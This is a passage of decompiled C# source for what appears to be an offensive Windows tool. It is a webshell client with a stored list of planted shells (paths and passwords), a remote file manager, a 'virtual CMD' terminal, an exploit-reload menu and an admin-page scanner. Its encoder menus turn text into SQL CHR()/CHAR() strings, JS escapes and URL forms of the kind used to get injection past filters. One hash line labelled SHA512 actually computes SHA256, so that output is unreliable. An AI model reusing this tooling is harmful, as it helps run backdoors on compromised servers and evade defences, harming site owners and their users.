                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string data = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length >= 1)
                    {
                        if (str3.Contains("@") && (str3.Substring(0, 1) == "@"))
                        {
                            data = data + str3.Substring(1, str3.Length - 1) + "\r\n";
                        }
                        else
                        {
                            data = data + str3 + "\r\n";
                        }
                    }
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 去掉行首去掉注释ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string data = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length >= 2)
                    {
                        if (str3.Contains("::") && (str3.Substring(0, 2) == "::"))
                        {
                            if (data != null)
                            {
                                data = data;
                            }
                            else
                            {
                                data = "";
                            }
                        }
                        else if (str3.Contains("@") && (str3.Substring(0, 1) == "@"))
                        {
                            data = data + str3.Substring(1, str3.Length - 1) + "\r\n";
                        }
                        else
                        {
                            data = data + str3 + "\r\n";
                        }
                    }
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 去掉注释ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string data = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length >= 2)
                    {
                        if (str3.Contains("::") && (str3.Substring(0, 2) == "::"))
                        {
                            if (data != null)
                            {
                                data = data;
                            }
                            else
                            {
                                data = "";
                            }
                        }
                        else
                        {
                            data = data + str3 + "\r\n";
                        }
                    }
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 全部复制ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetDataObject(("目标: " + this.copyExpDubugInfoURL + "\r\n\r\n") + ("Banner: " + this.GetMidStr(this.lbl_expDebugInfo.Text, "Banner:", "IP:").Trim() + "\r\n") + ("IP: " + this.GetMidStr(this.lbl_expDebugInfo.Text, "IP:", "位置:").Trim() + "\r\n") + ("位置: " + this.GetMidStr(this.lbl_expDebugInfo.Text, "位置:", "|").Trim().TrimEnd(new char[] { '|' }) + "\r\n"), true);
        }

        private void 全部加密结果ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string s = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "MD5(16): \t" + K8crack.K8MD5(s, 0x10) + "\r\n";
                string str3 = "MD5(32): \t" + K8crack.K8MD5(s, 0x20) + "\r\n";
                string str4 = "SHA1(40): \t" + K8crack.SHA1_Encrypt(s) + "\r\n";
                string str5 = "SHA256: \t" + K8crack.SHA256Encrypt(s) + "\r\n";
                string str6 = "SHA384: \t" + K8crack.SHA384Encrypt(s) + "\r\n";
                string str7 = "SHA512: \t" + K8crack.SHA256Encrypt(s) + "\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + "原文：\t" + s + "\r\n\r\n" + str2 + str3 + str4 + str5 + str6 + str7 + this.k8encodeSplit);
            }
        }

        private void 全选ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.txt_EncodeDecodeText.SelectAll();
        }

        private void 删除ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lv_webShell.SelectedItems.Count > 0)
            {
                string s = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[0].Text);
                string str2 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[2].Text);
                if ((MessageBox.Show("您确定要删除项目:  " + str2 + "  的Shell数据吗?", "友情提示!", MessageBoxButtons.YesNo) == DialogResult.Yes) && BLLk8shell.DeleteRecord(int.Parse(s)))
                {
                    this.K8loadWebShellData();
                }
            }
        }

        private void 删除ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.SelectedText = "";
            }
        }

        private void 添加ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new frmEditWebShell(this, null, null).Show();
        }

        private void 文件管理ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lv_webShell.SelectedItems.Count > 0)
            {
                string str = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[7].Text);
                string str2 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[8].Text);
                string str3 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[9].Text);
                this.txt_OneShellPath.Text = str;
                this.txt_OneShellPwd.Text = str2;
                this.cbb_utf8Gb3212CMD.Text = str3;
                this.tab_MainForm.SelectedTab = this.tab_MainForm.TabPages["tab_FileManage"];
                this.WebFileCurPath = "";
                this.K8_WebFileMgr();
                if (this.WebFileCurPath != "")
                {
                    this.K8_WebFileDirList();
                }
            }
        }

        private void 新建ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.txt_EncodeDecodeText.Text = "";
        }

        private void 修改ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lv_webShell.SelectedItems.Count > 0)
            {
                string sqlID = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[0].Text);
                string str2 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[2].Text);
                string str3 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[3].Text);
                string str4 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[4].Text);
                string str5 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[5].Text);
                string str6 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[6].Text);
                string str7 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[7].Text);
                string str8 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[8].Text);
                string str9 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[9].Text);
                string str10 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[10].Text);
                string str11 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[11].Text);
                string str12 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[12].Text);
                string str13 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[13].Text);
                string str14 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[14].Text);
                string str15 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[15].Text);
                string str16 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[0x10].Text);
                string str17 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[0x11].Text);
                string[] modelArray = new string[] { str2, str3, str4, str5, str6, str7, str8, str9, str10, str11, str12, str13, str14, str15, str16, str17 };
                new frmEditWebShell(this, modelArray, sqlID).Show();
            }
        }

        private void 虚拟CMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string str = "";
            if (this.lv_webShell.SelectedItems.Count > 0)
            {
                str = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[1].Text);
                this.txt_OneShellPath.Text = str;
                this.tab_MainForm.SelectedIndex = 5;
            }
        }

        private void 虚拟CMD终端ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lv_webShell.SelectedItems.Count > 0)
            {
                string str = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[7].Text);
                string str2 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[8].Text);
                string str3 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[9].Text);
                this.txt_OneShellPath.Text = str;
                this.txt_OneShellPwd.Text = str2;
                this.cbb_utf8Gb3212CMD.Text = str3;
                this.tab_MainForm.SelectedTab = this.tab_MainForm.TabPages["tab_CmdShell"];
            }
        }

        private void 以上算法全使用ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "Base64(GB2312): \t" + K8crack.Base64_encodeGB2312(str) + "\r\n";
                string str3 = "Base64(UTF8):   \t" + K8crack.Base64_encodeUTF8(str) + "\r\n";
                string str4 = "Base64(Unicode): \t" + K8crack.Base64_encodeUnicode(str) + "\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + "原文：\t" + str + "\r\n\r\n" + str2 + str3 + str4 + this.k8encodeSplit);
            }
        }

        private void 以上算法全使用ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "Hex编码(GB2312): \t" + K8crack.HexEncodeGB2312(str) + "\r\n";
                string str3 = "Hex编码(UTF8):   \t" + K8crack.HexEncodeUTF8(str) + "\r\n";
                string str4 = "Hex编码(Unicode): \t" + K8crack.HexEncodeUnicode(str) + "\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + "原文：\t" + str + "\r\n\r\n" + str2 + str3 + str4 + this.k8encodeSplit);
            }
        }

        private void 以上算法全使用ToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "Oracle_CHR():    \t" + K8crack.Oracle_ChrCode(str) + "\r\n";
                string str3 = "MSSQL_CHAR():    \t" + K8crack.MSSQL_ChrCode(str) + "\r\n";
                string str4 = "Mysql_CHAR()-1: \t" + K8crack.MYSQL_ChrCode(str) + "\r\n";
                string str5 = "Mysql_CHAR()-2: \t" + K8crack.MYSQL_ChrCode2(str) + "\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + "原文：\t" + str + "\r\n\r\n" + str2 + str3 + str4 + str5 + this.k8encodeSplit);
            }
        }

        private void 以上算法全使用ToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "FromCharCode:   \tString.fromCharCode(" + K8crack.K8Ascii_encode(str) + ")\r\n";
                string str3 = "HTML实体(Dec):  \t" + K8crack.K8HTMLCharacter10(str) + "\r\n";
                string str4 = "HTML实体(Hex):  \t" + K8crack.K8HTMLCharacter16(str) + "\r\n";
                string str5 = "HTML实体(UTF8): \t" + K8crack.MYSQL_ChrCode2(str) + "\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + "原文：\t" + str + "\r\n\r\n" + str2 + str3 + str4 + str5 + this.k8encodeSplit);
            }
        }

        private void 以上算法全使用ToolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "JS_Hex_String: \t" + K8crack.str2JSstringHex(str) + "\r\n";
                string str3 = "JS_Unicode: \t" + K8crack.Str2JS_Unicode(str) + "\r\n";
                string str4 = "JS_Escape: \t" + K8crack.K8JSescape(str) + "\r\n";
                string str5 = "JS_Escape_ALL: \t" + K8crack.K8JSescapeAll(str) + "\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + "原文：\t" + str + "\r\n\r\n" + str2 + str3 + str4 + str5 + this.k8encodeSplit);
            }
        }

        private void 以上算法全用ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "URL编码(全部):  \t" + K8crack.K8UrlEncodeAllStr(str) + "\r\n";
                string str3 = "URL编码(GB2312): \t" + K8crack.K8UrlEncodeGB2312(str) + "\r\n";
                string str4 = "URL编码(UTF-8):  \t" + K8crack.K8UrlEncodeUTF8(str) + "\r\n";
                string str5 = "URL编码(Unicode): \t" + K8crack.K8UrlEncodeUnicode(str) + "\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + "原文：\t" + str + "\r\n\r\n" + str2 + str3 + str4 + str5 + this.k8encodeSplit);
            }
        }

        private void 用Chrome打开ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.K8shellBrowserURL("chrome.EXE");
        }

        private void 用Chrome打开ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        }

        private void 用Chrome打开ToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            this.OpenScanAdminURL("chrome.EXE");
        }

        private void 用Chrome打开ToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string uRL = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                this.OpenURL("chrome.exe", uRL);
            }
        }

        private void 用Firefox打开ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.K8shellBrowserURL("Firefox.EXE");
        }

        private void 用Firefox打开ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        }

        private void 用Firefox打开ToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            this.OpenScanAdminURL("Firefox.EXE");
        }

        private void 用Firefox打开ToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string uRL = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                this.OpenURL("Firefox.exe", uRL);
            }
        }

        private void 用微软IE打开ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.K8shellBrowserURL("IEXPLORE.EXE");
        }

        private void 用微软IE打开ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        }

        private void 用微软IE打开ToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            this.OpenScanAdminURL("IEXPLORE.EXE");
        }

        private void 用微软IE打开ToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string uRL = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                this.OpenURL("IEXPLORE.exe", uRL);
            }
        }

        private void 粘贴ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Clipboard.GetDataObject().GetDataPresent(DataFormats.Text))
            {
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 只复制IPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetDataObject(this.GetMidStr(this.lbl_expDebugInfo.Text, "IP:", "位置:").Trim(), true);
        }

        private void 只有20空格ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("%20", " "));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 只有加号空格ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("+", " "));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 只有空格20ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace(" ", "%20"));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 只有空格URL编码ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace(" ", "+"));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 中文UnicodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.ChineseToUnicode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 重新加载EXPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.K8createTabExpBtn();
        }

        private void 转成PHPCHR字符串点号ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.PHP_ChrCodePlus(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成半角ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(this.ChangeStrToDBC(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成大写ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).ToUpper());
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成多行1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "";
                string[] strArray = new string[0];
                if (str.Contains("&"))
                {
                    strArray = str.Split(new char[] { '&' });
                }
                foreach (string str3 in strArray)
                {
                    if (str3.Trim() == "")
                    {
                        str2 = str2 + "\r\n";
                    }
                    else
                    {
                        str2 = str2 + str3 + "\r\n";
                    }
                }
                Clipboard.SetDataObject(str2.TrimEnd(new char[] { '&' }));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成多行1ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "";
                string[] strArray = new string[0];
                if (str.Contains("&"))
                {
                    strArray = str.Split(new char[] { '&' });
                }
                foreach (string str3 in strArray)
                {
                    if (str3.Trim() == "")
                    {
                        str2 = str2 + "\r\n";
                    }
                    else
                    {
                        str2 = str2 + str3 + "\r\n";
                    }
                }
                str2 = str2.TrimEnd(new char[] { '&' });
                TextBox box = new TextBox {
                    Text = str2
                };
                string data = "";
                foreach (string str5 in box.Lines)
                {
                    if (str5.Length >= 1)
                    {
                        if (str5.Contains("@") && (str5.Substring(0, 1) == "@"))
                        {
                            data = data + str5.Substring(1, str5.Length - 1) + "\r\n";
                        }
                        else
                        {
                            data = data + str5 + "\r\n";
                        }
                    }
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成多行2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("&&", "&");
                string str2 = "";
                string[] strArray = new string[0];
                if (str.Contains("&"))
                {
                    strArray = str.Split(new char[] { '&' });
                }
                foreach (string str3 in strArray)
                {
                    if (str3.Trim() == "")
                    {
                        str2 = str2 + "\r\n";
                    }
                    else
                    {
                        str2 = str2 + str3 + "\r\n";
                    }
                }
                Clipboard.SetDataObject(str2.TrimEnd(new char[] { '&' }));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成多行2ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).Replace("&&", "&");
                string str2 = "";
                string[] strArray = new string[0];
                if (str.Contains("&"))
                {
                    strArray = str.Split(new char[] { '&' });
                }
                foreach (string str3 in strArray)
                {
                    if (str3.Trim() == "")
                    {
                        str2 = str2 + "\r\n";
                    }
                    else
                    {
                        str2 = str2 + str3 + "\r\n";
                    }
                }
                str2 = str2.TrimEnd(new char[] { '&' });
                TextBox box = new TextBox {
                    Text = str2
                };
                string data = "";
                foreach (string str5 in box.Lines)
                {
                    if (str5.Length >= 1)
                    {
                        if (str5.Contains("@") && (str5.Substring(0, 1) == "@"))
                        {
                            data = data + str5.Substring(1, str5.Length - 1) + "\r\n";
                        }
                        else
                        {
                            data = data + str5 + "\r\n";
                        }
                    }
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成多行ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "";
                string[] strArray = new string[0];
                if (str.Contains(";"))
                {
                    strArray = str.Split(new char[] { ';' });
                }
                foreach (string str3 in strArray)
                {
                    str2 = str2 + str3 + ";\r\n";
                }
                Clipboard.SetDataObject(str2.TrimEnd(new char[] { ';' }));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成多行号结尾ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "";
                string[] strArray = new string[0];
                if (str.Contains(";"))
                {
                    strArray = str.Split(new char[] { ';' });
                }
                foreach (string str3 in strArray)
                {
                    if (str3.Trim() == "")
                    {
                        str2 = str2 + "\r\n";
                    }
                    else
                    {
                        str2 = str2 + str3 + ";\r\n";
                    }
                }
                Clipboard.SetDataObject(str2.TrimEnd(new char[] { ';' }));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成全角ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).ToLower();
                Clipboard.SetDataObject(this.ChangeStrToSBC(str));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成小写ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text)).ToLower());
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成一行1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string str2 = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length > 0)
                    {
                        if (str3.Contains("::") && (str3.Substring(0, 2) == "::"))
                        {
                            if (str2 != null)
                            {
                                str2 = str2;
                            }
                            else
                            {
                                str2 = "";
                            }
                        }
                        else
                        {
                            str2 = str2 + str3 + "&";
                        }
                    }
                }
                Clipboard.SetDataObject(str2.TrimEnd(new char[] { '&' }));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成一行1ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string str2 = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length > 0)
                    {
                        if (str3.Contains("::") && (str3.Substring(0, 2) == "::"))
                        {
                            if (str2 != null)
                            {
                                str2 = str2;
                            }
                            else
                            {
                                str2 = "";
                            }
                        }
                        else
                        {
                            str2 = str2 + "@" + str3 + "&";
                        }
                    }
                }
                Clipboard.SetDataObject(str2.TrimEnd(new char[] { '&' }));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成一行2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string str2 = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length > 0)
                    {
                        if (str3.Contains("::") && (str3.Substring(0, 2) == "::"))
                        {
                            if (str2 != null)
                            {
                                str2 = str2;
                            }
                            else
                            {
                                str2 = "";
                            }
                        }
                        else
                        {
                            str2 = str2 + str3 + "&&";
                        }
                    }
                }
                Clipboard.SetDataObject(str2.TrimEnd(new char[] { '&' }).TrimEnd(new char[] { '&' }));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成一行2ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string str2 = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length > 0)
                    {
                        if (str3.Contains("::") && (str3.Substring(0, 2) == "::"))
                        {
                            if (str2 != null)
                            {
                                str2 = str2;
                            }
                            else
                            {
                                str2 = "";
                            }
                        }
                        else
                        {
                            str2 = str2 + "@" + str3 + "&&";
                        }
                    }
                }
                Clipboard.SetDataObject(str2.TrimEnd(new char[] { '&' }).TrimEnd(new char[] { '&' }));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成一行rnToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string data = "";
                foreach (string str3 in box.Lines)
                {
                    data = data + str3 + @"\r\n";
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成一行ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string data = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length > 0)
                    {
                        data = data + str3;
                    }
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void 转成一行ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string data = "";
                foreach (string str3 in box.Lines)
                {
                    if (str3.Length > 0)
                    {
                        data = data + str3;
                    }
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        public static bool IsUnix
        {
            get
            {
